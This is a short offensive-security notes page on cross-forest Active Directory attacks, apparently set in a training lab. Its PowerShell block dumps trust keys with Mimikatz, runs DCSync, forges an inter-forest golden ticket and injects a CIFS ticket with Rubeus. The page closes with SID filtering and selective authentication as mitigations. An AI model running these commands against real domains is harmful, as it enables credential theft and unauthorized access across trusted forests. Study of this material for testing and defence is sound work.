---
title: "Cross-Forest Attacks"
description: "Cross-forest attacks."
lead: "Cross-forest attacks using trust keys and tickets."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "trust_attacks"
weight: 20
toc: true
---

## General

- Same attack flow as with cross-domain attacks
- But: trust between forest must be established manually
- No implicit trust
- Cannot abuse SID because of SID filtering
- We only get the privileges the user we are impersonating has in the target forest

## Exploitation

```powershell
# Get trust key for the inter-forest trust
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dcorp-dc
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\ecorp$"'

# Forge inter-forest TGT
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /user:Administrator /target:eurocorp.local /rc4:9a3dafc4139bc3fb7b6dade2a35d6f74 /service:krbtgt /ticket:forest_tgt.kirbi"'

# Request and inject TGS for CIFS service using Rubeus
.\Rubeus.exe asktgs /ticket:forest_tgt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt

# Check access
ls \\eurocorp-dc.eurocorp.local\SharedWithDCorp\
```

## Mitigation

### SID Filtering

- Avoid attacks which abuse SID history attribute across forest trust
- Enabled by default on all inter forest trusts. Intra forest trusts are assumed secured by default (MS considers forest and not the domain to be a security boundary)
- But, since SID filtering has potential to break applications and user access, it is often disabled

### Selective Authentication

- If configured in an inter-forest trust, users between trusts will not be automatically authenticated
- Invididual access to domains and servers in the trusting domain/forest should be given
